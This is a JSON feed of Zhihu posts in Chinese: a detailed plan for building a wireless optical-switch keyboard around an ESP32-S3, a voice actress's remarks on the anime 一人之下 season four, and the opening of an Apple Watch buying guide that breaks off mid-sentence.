[{"title":"Goodbye, 机械键盘","date":"2021-10-08 11:18:32","description":"\n<p><a href=\"https://zhuanlan.zhihu.com/p/41285686\" class=\"internal\">上一篇文章</a>中，做的机械键盘用了三年多，我寻思可以换个新的了。那正好和机械键盘说再见，做个光轴键盘。同时也可以作为电子电路的 Hello world 研究作业。</p>\n<h2>电路的基础知识</h2>\n<p>作为电子电路的外行人士，还是需要学习一个。</p>\n<p>第一是重温电路的基本定律：</p>\n<ul>\n<li>欧姆定律</li>\n<li>基尔霍夫电流定律，基尔霍夫电压定律</li>\n<li>戴维南定理</li>\n</ul>\n<p>依靠这些基本定律，可以通过解线性方程组的方式进行电路分析。</p>\n<p>然后引入非线性元件：</p>\n<ul>\n<li>电感： <img src=\"https://www.zhihu.com/equation?tex=V%3DL%5Cfrac%7BdI%7D%7Bdt%7D\" alt=\"V=L\\frac{dI}{dt}\" eeimg=\"1\">\n</li>\n<li>电容： <img src=\"https://www.zhihu.com/equation?tex=I%3DC%5Cfrac%7BdV%7D%7Bdt%7D\" alt=\"I=C\\frac{dV}{dt}\" eeimg=\"1\">\n</li>\n</ul>\n<p>这时需要解的就是线性微分方程组了。通过拉普拉斯变换，依然可以变成代数方程组解决。进一步分析需要信号与系统和小波分析的相关知识。不过这些方法基本都集成在电路模拟工具中了，例如可以用这个在线工具：<a href=\"https://link.zhihu.com/?target=https%3A//www.circuitlab.com/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">circuitlab.com/</span><span class=\"invisible\"></span></a> 。</p>\n<p>然后是半导体元件：</p>\n<figure data-size=\"small\"><img src=\"https://pic3.zhimg.com/v2-dc4a4f2eef489fe83399d8431804bd22_b.jpg\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"2880\" data-rawheight=\"966\" class=\"origin_image zh-lightbox-thumb\" width=\"2880\" data-original=\"https://pic3.zhimg.com/v2-dc4a4f2eef489fe83399d8431804bd22_r.jpg\"></figure><ul>\n<li>N 型半导体 (negative charge)：掺杂了磷、砷、锑等，电子为载流子</li>\n<li>P 型半导体 (positive charge)：掺杂了硼、铟等，空穴为载流子</li>\n<li>肖特基管</li>\n<li>二极管和三极管</li>\n<li>场效应管</li>\n</ul>\n<p>然后是微控制器：</p>\n<ul>\n<li>时钟</li>\n<li>中断</li>\n<li>pull-up 和 pull-down 输入</li>\n<li>开漏 (open-drain) 输出</li>\n<li>推挽 (push-pull) 输出</li>\n<li>ADC</li>\n<li>常用通信协议：I2C 和 SPI</li>\n</ul>\n<p>真实世界中，每个元件都不是单纯的元件——例如每个电阻，其实都是<b>电阻、电感和电容的集合体</b>。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-584ece1dbf8d813df72f94a873c72b18_b.jpg\" data-size=\"normal\" data-rawwidth=\"1276\" data-rawheight=\"766\" class=\"origin_image zh-lightbox-thumb\" width=\"1276\" data-original=\"https://pic1.zhimg.com/v2-584ece1dbf8d813df72f94a873c72b18_r.jpg\"><figcaption>解耦电容需要尽量少的 L</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>每个元件的特性都不是简单的线性关系，会受温度、光照的影响。元件和导线之间还会感应、干扰。电路的输入信号也从来不是理想的。元件厂家的 datasheet 会提供一些额外的参数和数据方便分析。除此之外，还需要吸收大量前人的设计经验和艺术：</p>\n<figure data-size=\"small\"><img src=\"https://pic1.zhimg.com/v2-7e4ed3d3d187f62ff385a131162d3a08_b.jpg\" data-size=\"small\" data-rawwidth=\"658\" data-rawheight=\"852\" class=\"origin_image zh-lightbox-thumb\" width=\"658\" data-original=\"https://pic1.zhimg.com/v2-7e4ed3d3d187f62ff385a131162d3a08_r.jpg\"><figcaption>太厚了…就看一小半吧</figcaption></figure><p>还有些基础理论（选修），涉及固体物理和控制论：</p>\n<ul>\n<li>费米能</li>\n<li>肖特基势垒、欧姆接触</li>\n<li>PID 控制</li>\n</ul>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c8d2a255d79d02919f6df1a777e60ea0_b.jpg\" data-size=\"normal\" data-rawwidth=\"4096\" data-rawheight=\"3170\" class=\"origin_image zh-lightbox-thumb\" width=\"4096\" data-original=\"https://pic1.zhimg.com/v2-c8d2a255d79d02919f6df1a777e60ea0_r.jpg\"><figcaption>控制论劝退图</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<h2>整理需求</h2>\n<p>对要做的新版本键盘，理了一下自己的需求包括 functional requirement 如下：</p>\n<ul>\n<li>蓝牙 USB <b>双模</b>，键盘还能连接 <b>Wi-Fi</b>，接上后输出键盘的 Wi-Fi 地址，用电脑访问地址弹出配置网页，点保存就可以。所以用户不用安装软件、不用交网费就能全平台配置键位。</li>\n<li>使用 <b>USB-FS </b>(full speed，全速，帧间隔 1ms)</li>\n<li>\n<b>左右分离</b>，通过 SPI 通信。</li>\n<li>可外接设备如微型<b>轨迹球</b>和<b>麦克风</b>\n</li>\n<li>无线<b>电子墨水显示</b>键盘状态，不需要 LED</li>\n<li>能贴片的全<b>让代工厂贴</b>了，避免手工焊接。</li>\n<li>最后且最重要的：和触点开关的机械键盘说再见，用<b>光轴</b>\n</li>\n</ul>\n<figure data-size=\"small\"><img src=\"https://pic1.zhimg.com/v2-d608a7c2bb3f87006404a476dd589bec_b.gif\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"1220\" data-rawheight=\"686\" data-thumbnail=\"https://pic1.zhimg.com/v2-d608a7c2bb3f87006404a476dd589bec_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1220\" data-original=\"https://pic1.zhimg.com/v2-d608a7c2bb3f87006404a476dd589bec_r.jpg\"></figure><p>光轴的原理是 PCB 上摆一个红外发光二极管和一个接收器（三极管），没按下去时接收器导通。轴体按下去阻隔了红外光，接收器电阻变大相当于断开。相比机械轴，光轴的信号极其平滑，抖动很少（据说也有抖动，是否需要防抖得测试一下再说），响应一般在 0.1ms 内。由于没有触点，光轴也更顺滑，使用寿命要长 50% 以上。由于不用和 PCB 连接，轴的受力可以完全加在板上，不会影响 PCB 寿命。</p>\n<p>光轴还有一个优势是：输入电路和输出电路之间以光耦合，不存在电流乱走造成幽灵按键的问题。</p>\n<p>其他选择：模拟光轴或者霍尔效应轴，但模拟光轴还没有方便购买的散货。霍尔效应轴就佳达隆一家有量产，写信联系它又不理我。途中有一位热心的老哥 riskable 给我发了他的 3D 打印霍尔效应轴图纸，但由于制作有点麻烦，最后还是没那么做。对霍尔效应轴感兴趣的朋友，可以看看 <a href=\"https://link.zhihu.com/?target=http%3A//input.club/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">input.club</a> 的 Keystone。</p>\n<h2>关于延迟的讨论</h2>\n<p>人类的反应时间在 300ms 左右。如果练成了“肌肉记忆”，对特定信号的反应会更快。例如闪烁躲锤子，反应在 200ms 都是有可能的。</p>\n<p>机械轴触点的抖动一般在 5ms 内，如果要防止误触发（例如键盘震动造成的簧片抖动、感应无线电波造成电平变化等，比较少见但是有可能），最好进行 10ms 左右的 debounce 之后再发送信号。这就引入了 10ms 的延迟，很多低成本键盘为了方便，甚至把防抖搞到了 <b>30ms</b>。光轴信号是无抖的，不用做这个消抖，且感应元件微秒级的响应，就算求稳加入防抖，<b>1ms</b> 的前摇消抖就可以（后摇依然可以 30ms，人没法在这么短时间内按同一个键两次）。</p>\n<p>微控制器的扫描间隔会造成延迟，执行代码也需要时间，可以提高主频和扫描频率，使之可忽略不计。</p>\n<p>一些键盘声明为 USB 低速设备，帧间隔 8ms，那也会造成 <b>0-8ms</b> 的输入延迟。USB 全速帧间隔 1ms，高速帧间隔 0.125ms。一般如果键盘用的微控制器价值高于 1 块钱的话，会支持到 USB 全速，于是由 USB 帧间隔导致的延迟在 <b>0-1ms</b> 之间。</p>\n<p>USB 集线器也会造成延迟。有些显示器可以外插 USB，这也是一种集线器。延迟的量级在 10 个帧左右，如果帧间隔是 8ms，你就在集线器获得了 <b>80ms</b> 的延迟。为了最小化延迟，建议直连而不是通过集线器。</p>\n<p>USB 的信号一般是通过南桥芯片/ICH再进 CPU。ICH 是 IO Control Hub 的缩写，说白了也是一种集线器，它不是转到 USB 协议，工作的频率很高，造成的延迟大概可忽略不计？</p>\n<p>显示器延迟也不可忽略，普通显示器刷新率低如 60Hz，还有响应时间延迟如 5ms，那显示延迟就是 5-22ms。换用快响应时间如 1ms 及刷新率 144Hz 的显示器，显示延迟可降低到 <b>1-8ms</b>。</p>\n<p>网络延迟很难估算，只能通过升级套餐、和运营商扯皮等方式解决。</p>\n<p>综上，</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<th></th>\n<th>普通设备的延迟(ms)</th>\n<th>改进后的延迟(ms)</th>\n</tr>\n<tr>\n<td>显示器</td>\n<td>5-22</td>\n<td>1-8</td>\n</tr>\n<tr>\n<td>防抖</td>\n<td>30</td>\n<td>1</td>\n</tr>\n<tr>\n<td>USB 速度</td>\n<td>0-8</td>\n<td>0-1</td>\n</tr>\n<tr>\n<td>集线器</td>\n<td>80</td>\n<td>0</td>\n</tr>\n<tr>\n<td>总计</td>\n<td>120-145</td>\n<td>2-10</td>\n</tr>\n</tbody></table>\n<p>可看到，其中改善防抖、去掉集线器的收益最大。</p>\n<h2>信息储备</h2>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-dccddb1cf23368767afb8be97d0af3c3_b.jpg\" data-size=\"normal\" data-rawwidth=\"2700\" data-rawheight=\"3600\" class=\"origin_image zh-lightbox-thumb\" width=\"2700\" data-original=\"https://pic4.zhimg.com/v2-dccddb1cf23368767afb8be97d0af3c3_r.jpg\"><figcaption>看电路图和看交通标志一样复杂</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>为了支持这个设计，需要点实操培训。所以就先学习了一遍 Phil's Lab 的 STM32 PCB 设计+嘉立创打板教程。高频电路的设计技巧是：同类元件和同类信号尽量在同一区域；层越多越好，信号/power pour 和 ground plane 相间；当信号穿越 via 时，在旁边也来一个 ground via 配对；power 和 ground 之间电容越大越好 —— 因为高频信号无时无刻都在辐射，信号附近有地可以保证能量基本在它们之间的电介质传输，从而避免辐射到外面去。</p>\n<p>然后就是微控制器 (MCU) 选型。现在由于芯片荒，主流 MCU 都涨价且缺货… 看了一百多本手册和价格以后，基本候选在下面几个 MCU：</p>\n<ul>\n<li>ESP32-PICO。支持 Wi-Fi + 蓝牙，有 touch sense 功能，一个模组不仅自带天线，还打包了晶振，简直太方便了，写文章时单片 20 块左右。SDK 也是我喜欢的，可以命令行搞定。</li>\n<li>类似 STM32 的国产芯片，例如 GD32, MM32, FM32, 雅特力, Holtek 等，价格便宜且容易买到货，就是文档和工具比 STM32 / ESP32 差得远。</li>\n<li>高通 QCA4020。有 Wi-Fi + 蓝牙支持，PIN 很多但大部分都是地，可用 GPIO 的数量其实要少很多，不好贴。</li>\n<li>高通骁龙系列。类似 QCA4020，运算能力强，可以买拆机垃圾，同样不好贴。</li>\n<li>nRF52840。有 Wi-Fi + 蓝牙支持，48 个 GPIO 差不多刚好支持单手键盘全键直连和中断驱动。缺点是比 ESP32 贵不少。</li>\n<li>最近量产的 ESP32-S3。Wi-Fi + 蓝牙支持，44 个 GPIO，自打包了 PSRAM、晶振和天线。核心是 Cadence 家的 Tensilica Xtensa 双核，这个架构优点是提供了一套定制工具，相比千篇一律的 ARM 处理器可以发挥定制能力强的优势。价格便宜，简直是国产之光，我直接下单了 10 片。</li>\n</ul>\n<p>然后是光轴相关资料，有个叫 optical-future 的论坛上把发射器/接收器资料和光轴设计要考虑的点都讨论了个遍，节约了我很多功夫。下图 D4 为发射器，Q2 为接收器。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9f1cc815b73f7d4a6a6089bd3dcf66a8_b.jpg\" data-size=\"normal\" data-rawwidth=\"358\" data-rawheight=\"426\" class=\"content_image\" width=\"358\"><figcaption>参考光耦电路</figcaption></figure><p>发光二极管采用 IR12-21C-TR8。</p>\n<p>光敏三极管采用 PT12-21B-TR8。</p>\n<p>光轴尺寸：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9457eca979473a0a5370cd59c8b58f6c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"773\" data-rawheight=\"992\" class=\"origin_image zh-lightbox-thumb\" width=\"773\" data-original=\"https://pic1.zhimg.com/v2-9457eca979473a0a5370cd59c8b58f6c_r.jpg\"></figure><p>PCB 上的打洞尺寸：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bfcd8661abc5657e094fe4d0fd700ba3_b.jpg\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"536\" class=\"origin_image zh-lightbox-thumb\" width=\"934\" data-original=\"https://pic4.zhimg.com/v2-bfcd8661abc5657e094fe4d0fd700ba3_r.jpg\"><figcaption>By leavenember, Pad size X 为 2.85mm 更合适</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>然后是迷你轨迹球相关资料，基本锁定在：</p>\n<ul>\n<li>霍尔效应轨迹球 Trackball Breakout，I2C 低速接口</li>\n<li>光学轨迹球 Pixart PAW3204OA，SPI 接口</li>\n</ul>\n<p>ESD 保护，也就是 electro-static discharge 保护，是一种防止静电放电破坏电子元件的元件。选定为给 USB 优化的专门元件 USBLC6-2。</p>\n<figure data-size=\"small\"><img src=\"https://pic1.zhimg.com/v2-ce2f94b69b09e80fa03ba5b1a954b6a0_b.jpg\" data-size=\"small\" data-rawwidth=\"696\" data-rawheight=\"514\" class=\"origin_image zh-lightbox-thumb\" width=\"696\" data-original=\"https://pic1.zhimg.com/v2-ce2f94b69b09e80fa03ba5b1a954b6a0_r.jpg\"><figcaption>USBLC6-2</figcaption></figure><figure data-size=\"small\"><img src=\"https://pic3.zhimg.com/v2-b511f1265c1e64ee4ec6e9277c010e56_b.jpg\" data-size=\"small\" data-rawwidth=\"650\" data-rawheight=\"388\" class=\"origin_image zh-lightbox-thumb\" width=\"650\" data-original=\"https://pic3.zhimg.com/v2-b511f1265c1e64ee4ec6e9277c010e56_r.jpg\"><figcaption>连接方式, _CONN_ 标签为接口方向</figcaption></figure><p>USB 供电是 5V 的，但芯片基本都需要 3.3V，所以需要变压。考虑到电器的阻抗会变化，不能简单的用电阻串联分流，而可以用自动稳压的元件来供电。MCP16301/H 就是这么一种，利用输出电压的反馈自动控制，来稳压的元件。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1dd95c9d53870bd7a6aa9eb1433907d1_b.jpg\" data-size=\"normal\" data-rawwidth=\"1086\" data-rawheight=\"442\" class=\"origin_image zh-lightbox-thumb\" width=\"1086\" data-original=\"https://pic2.zhimg.com/v2-1dd95c9d53870bd7a6aa9eb1433907d1_r.jpg\"><figcaption>MCP16301/H 的参考电路</figcaption></figure><p>解耦电容：传统键盘电路都是低频信号不太用考虑，但这里有 2.4G 的蓝牙信号和 40M 的 Wi-Fi 高频信号，所以也需要添加些解耦电容，吃掉高频的信号对我们 IO 端口的干扰。好在可以按照 MCU 参考电路添加。</p>\n<p>了解 I2C 的原理，一般芯片支持 100kHz/400kHz 的通信速度。</p>\n<p>了解 SPI 的原理，一般芯片支持主频/n 的 SPI 通信速度，所以比 I2C 要快。</p>\n<p>了解 USB 的原理：</p>\n<a href=\"https://link.zhihu.com/?target=https%3A//www.usbmadesimple.co.uk/ums_1.htm\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-bfb6684e67a8f01ee779ed94b8a93891_180x120.jpg\" data-image-width=\"600\" data-image-height=\"180\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">USB Made Simple - Part 1</a><p>如果芯片支持 USB-HS 也就是 high speed，那也能克服集线器的限制了，因为集线器增加约 10 个帧，对 USB-HS 也就 1.25ms 的延迟，是可以忽略的。遗憾的是支持 USB-HS 的芯片非常少。现在我找到的两种方案是：</p>\n<ul>\n<li>利用 USB PHY 元件如 USB3300 来连接，但这些元件需要 ULPI 协议，没 FPGA 似乎搞不定</li>\n<li>使用 Atmel 的 SAM9X 这种支持高速 USB 的芯片</li>\n</ul>\n<p>以上两种方案成本都比较高，USB-HS 就留待下个版本的迭代吧。</p>\n<p>无线射频：对 2.4G 频率的信号，主要利用超外差式的方式进行接收，也就是，用和信号相近的本地信号和接收到的信号混频，产生容易处理的、频率低得多的 IF (intermediate frequency) 信号。这方面的基础知识，建议参考：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d8c2d12b01bb54474256fa623178655f_b.jpg\" data-size=\"normal\" data-rawwidth=\"355\" data-rawheight=\"500\" class=\"content_image\" width=\"355\"><figcaption>一次 RubyConfChina 上，我在图灵的展位半价买的</figcaption></figure><p>天线在 PCB 上画，同样可以用参考设计。天线的分析原理可以用 <img src=\"https://www.zhihu.com/equation?tex=A-%5Cphi\" alt=\"A-\\phi\" eeimg=\"1\"> 方程，即磁矢量位(magnetic vector potential) 和电标量位 (electric scaler potential) 方程计算。不过买的 SoC (system on chip) 模组自带天线，不需要自己画天线了。还有个问题是，金属载板会阻挡信号，解决办法是让天线凸出去。</p>\n<p>这次不搞灯，没必要低头看键盘的状态，显示器旁放一个无线显示就可以了。可以购买现成的 ESP32+电子墨水屏+电池的组合，以 Wi-Fi 连接到键盘。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2b952f662b6542d19302475af86129af_b.jpg\" data-size=\"normal\" data-rawwidth=\"1488\" data-rawheight=\"922\" class=\"origin_image zh-lightbox-thumb\" width=\"1488\" data-original=\"https://pic4.zhimg.com/v2-2b952f662b6542d19302475af86129af_r.jpg\"><figcaption>这个电子墨水屏有点太大了，我觉得 4 寸的贴显示器旁就可以</figcaption></figure><p>语音识别，ESP32 有现成的 SDK 可用。</p>\n<h2>低功耗设计</h2>\n<p>我们可以循序渐进，先做好有线连接的设计，再做无线连接的设计。光轴的缺点是一直需要点亮发射器，键盘扫描耗电大，做低功耗就需要经常休眠。而休眠做得不好的产品，例如 M$ 的 Sculpt 鼠标，一段时间不动，就得两秒唤醒，给使用增加很多麻烦。</p>\n<p>一个低功耗的键盘，应该可以在下面三种工作模式切换：</p>\n<ul>\n<li>正常工作模式：如果一段时间没有输入，进入浅睡眠模式</li>\n<li>浅睡眠模式：降低主频和扫描频率，有按键时进入正常工作模式</li>\n<li>深睡眠模式：停止扫描，切换到低功耗的协处理器，启用 proximity sensor，当有人接近时唤醒到浅睡眠模式</li>\n</ul>\n<p>proximity sensor 有很多种，备选的几种方案有：</p>\n<ul>\n<li>基于 Wi-Fi CSI 的检测：需要比较多的计算，可能并不省电</li>\n<li>基于电容的检测：省电，但探测距离过近 (一般只有 mm)</li>\n<li>环境光检测：要做差分，而且如果环境黑暗就不适用了</li>\n<li>主动红外光检测：现在的主流方案，通过一个红外发光二极管发光，如果人手接近键盘，就会反射红外光，再通过环境光感应器读数。主动探测的发光二极管功耗比较高，但因为感应器响应很快，可以通过减少发光时长和频率来降低消耗。</li>\n</ul>\n<p>检测到接近后，通过 I2C 发送信号到 ESP32-S3 的超低功耗协处理器 (ULP)。协处理器是一个 <a href=\"https://link.zhihu.com/?target=https%3A//docs.espressif.com/projects/esp-idf/en/latest/esp32/api-guides/ulp_instruction_set.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RISC-V 指令集</a>的简单 CPU，可以用简单的汇编编写其逻辑。其中几个会用到的扩展指令是： </p>\n<ul>\n<li>REG_WR: 改变 IO 引脚电平，打开红外发光二极管</li>\n<li>ADC: 读数</li>\n<li>WAKE: 指令唤醒主处理器</li>\n</ul>\n<h2>低能耗的扫描逻辑</h2>\n<p>查手册，估算每个红外发光二极管正常工作电流约为 20mA，一个键盘 80 个键，全部并联点亮那就是 1600mA，已经超过 USB 2.0 允许的最大电流了。有几个办法改善：</p>\n<ul>\n<li>红外二极管的正常工作电压是 1.2V 左右，我们用 3.3V VDD 供电，二极管 3 个一组串联，那刚好每个二极管分配 1.1V 的电压，就不需要在电阻里浪费功耗了。</li>\n<li>和扫描矩阵一样，分组轮流点亮，每次只点亮 3 个管。瞬间电流是 20mA</li>\n</ul>\n<p>还有可以想到的一点是，点亮时间是越短越省电。我们先计算一下以下几个必要的延迟：</p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<th>种类</th>\n<th>延迟</th>\n</tr>\n<tr>\n<td>从设置 output pin 到输出改变</td>\n<td>20-100ns（没有资料，按场效应管响应时间得出的估计值）</td>\n</tr>\n<tr>\n<td>红外发光的响应时间</td>\n<td>20ns（类似产品的估算值）</td>\n</tr>\n<tr>\n<td>红外感应的响应时间</td>\n<td>15μs（手册给出）</td>\n</tr>\n<tr>\n<td>从输入改变到 input pin 值改变</td>\n<td>1.8μs（网友实验测量值）</td>\n</tr>\n</tbody></table>\n<p>如果规划 50μs 的点亮时间，以总计 40 个键计算，可得一个扫描周期约为 40 / 3 * 0.05 = 0.65ms，此时等效功耗为 3.3V x 20mA。如果压缩点亮时间到 30μs，单扫描周期延长到 0.8ms，等效功耗为 3.3V x 8mA。再考虑深浅睡眠停止扫描，用 2000mAH 的电池供电能工作挺久的了，实际使用再进行调整。</p>\n<p>还有一个问题，计算得三个串联发光二极管的等效内阻约为 165Ω，ESP32 单 output pin 是否可以对其输出 20mA 左右的驱动电流？按<a href=\"https://link.zhihu.com/?target=https%3A//esp32.com/viewtopic.php%3Ft%3D5840\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">网友的测量</a>应该可以：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b32e52f3470db69c009c1432d8a86c3d_b.jpg\" data-size=\"normal\" data-rawwidth=\"1758\" data-rawheight=\"1192\" class=\"origin_image zh-lightbox-thumb\" width=\"1758\" data-original=\"https://pic2.zhimg.com/v2-b32e52f3470db69c009c1432d8a86c3d_r.jpg\"><figcaption>上图中驱动强度为3(source3)的曲线，第6个点负载 150Ω，刚好是20mA</figcaption></figure><p>还有一个问题，发光二极管是非线性元件，各管有公差，串联起来会不会一个电压特别大，另外一个电压特别小呢？查看数据手册的电压-电流曲线可以知道，电压越大，等效电阻越小，电阻变小就反过来让它分到的电压变小，因此这个串联效果是稳定趋于均分的。</p>\n<h2>工程规划</h2>\n<p>综上，大体设计和可行性分析已经无大问题，制作流程大致为：</p>\n<ul>\n<li>打印一个多功能的 Breakout 测试板，顺便练习手焊模块</li>\n<li>打板、编程</li>\n<li>设计外壳、切削</li>\n<li>扩展电路添加外接的轨迹球</li>\n<li>添加无线显示</li>\n</ul>\n<h2>工具准备</h2>\n<p>为烧录和 debug 准备了 90 块的国产 DAPLink 一个，但直接用 ESP-IDF 增加一个 USB-UART 就可以了。 </p>\n<p>画 PCB 依然是 KiCAD，元件的引脚、模型可以在 <a href=\"https://link.zhihu.com/?target=https%3A//www.ultralibrarian.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Ultra Librarian</a> 搜出来下载。</p>\n<p>使用 ngSPICE 做电路模拟。</p>\n<p>板和壳建模仍旧是 OpenSCAD。</p>\n<p>光轴若干，买回来量量尺寸，做个准备。</p>\n<p>Filco style 板载卫星轴。</p>\n<p>左右通信线材选用 USB 线，全接 Type-C 口。</p>\n<p>焊接工具等。</p>\n<p>频谱分析仪、网络分析仪、信号发生器、矢量信号分析仪——暂时不需要。</p>\n<h2>以上，暂时就酱，可以动手开工了。</h2>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/luikore?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">luikore</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/406619338?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产动画《一人之下》第四季开播，你感觉如何？","date":"2021-10-08 10:34:39","description":"\n<p>谢邀~</p>\n<p>宝儿姐的配音演员前来安利！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f2693f705b438f115ac9a8201da971d9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"463\" data-rawheight=\"357\" data-watermark=\"watermark\" data-original-src=\"v2-f2693f705b438f115ac9a8201da971d9\" data-watermark-src=\"v2-99ef34fbc478f6495234a30350bd7d80\" data-private-watermark-src=\"v2-bf68072726acc4733aaecde8caa6f27d\"></p>\n<h3>1、 这一季的宝儿姐，和前三季相比有什么变化？</h3>\n<p>其实宝儿姐本质上是没有太大变化的，只是随着剧情的展开，宝儿姐表现出来的样子越来越立体化，作为观众，对她的了解也更深入、更全面、更多角度了。从观众的角度来看，第四季的宝儿姐会更加老江湖，尤其和各大区临时工们协作完成任务的时候，更加体现出了诸葛青口中的「惯匪」属性</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8ad218cbe8dd808675f6c94e8d63b28e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-8ad218cbe8dd808675f6c94e8d63b28e\" data-watermark-src=\"v2-ed8ede435b130331a7673ebffefd9011\" data-private-watermark-src=\"v2-3a1b1f764bda9c18b9aaecaf48be0220\"></p>\n<h3>2、《一人之下4》宝儿姐给你最大的惊喜是？</h3>\n<p>从外在上说，这一季的宝儿姐太帅了！</p>\n<p>这一季终于有了势均力敌同样又帅又萌又能打、并且正面交锋的对手了！没错就是陈朵~刚看完第三集，踩着唢呐BGM出场的宝儿姐跟陈朵的那段打斗，弹幕上一片叫绝（其中就有我发的，嘻嘻）</p>\n<a href=\"https://www.zhihu.com/video/1428149103351599104\">一人之下4-宝儿姐vs陈朵</a><p>从内在上说，人物形象更丰满了，除了机（dai）智（meng）、专（guan）业（fei）之外，这一季显得更加老江湖，表现出了作者二爷说「六厂二车间的冯师傅」的气质，不管有什么事儿，只要宝儿姐在，就“稳了”，这种感觉在后面也会体现地越来越多</p>\n<h3><b>3、 分享一下动画录音中的趣事吧~</b></h3>\n<p>前几季有不少好玩的事情，都跟大家分享过了，说个这一季的吧…</p>\n<p>这一季刚开始录制的时候，配音导演藤新老师就说，这一季要全部都用四川话录，作为一个天津人，压力一下子就大了，于是每次录音我都会专门带一个四川小姐姐过去，现场指导四川话。</p>\n<p>宝儿姐这种人美路子野人狠话不多的角色，每集词都很少，所以还比较顺利。有一次说要录音，就赶紧召唤方言指导一起过去（我们录音之前一般是不知道具体要录什么内容的）到了之后才发现，几集的内容基本全是气息，小姐姐在旁边等了半天，一句都没指导上，完全没有成就感~</p>\n<p><img src=\"https://pic2.zhimg.com/v2-48aa471646c65868fbb60ce1803c66bf_720w.jpeg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"887\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-48aa471646c65868fbb60ce1803c66bf\" data-watermark-src=\"v2-b80544217e590755fd5c67078258186e\" data-private-watermark-src=\"v2-eab1bd075f9e4cf9ae93a2fc3a6d2c47\"></p>\n<p><br></p>\n<h3><b>4、想对冯宝宝粉丝们说的话</b></h3>\n<p>很荣幸能作为配音演员，把宝儿姐呈现给大家；也很开心作为粉丝，跟大家一起陪着宝儿姐一路走下来~</p>\n<p>「一人之下」是一部非常优秀的作品，在追漫画和动画的同时，你们也会看到自己的成长。希望大家能一直喜欢和支持「一人之下」</p>\n<p>记得<b>每周五中午</b>来<b>腾讯视频</b>看宝儿姐哦~</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mi-qi-xiao-lian-sha?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">米琪小连杀</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488660280/answer/2153069757?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">346 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/468563690?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》八奇技中的神机百炼？</a><br><a href=\"http://www.zhihu.com/question/399121262?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《一人之下》老天师杀那么多全性最终目的是不是为了保护张楚岚？</a><br>\n","link":"http://www.zhihu.com/question/488660280/answer/2153069757?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新一代 Apple Watch 今晚开卖，如何选择适合自己的那一款？","date":"2021-10-08 10:12:07","description":"\n<p>继 9 月 15 日新一代 Apple Watch 发布之后，Apple Watch Series 7 终于将在一个月后的 10 月 15 日正式开售；而在今晚，如果你准备入手新款 Apple Watch，可以于 20:00 前往 Apple 官网或者 Apple Store 应用进行线上订购，以便在正式发售之后，能够尽快拿到新表。</p>\n<p>如果你有购入 Apple Watch 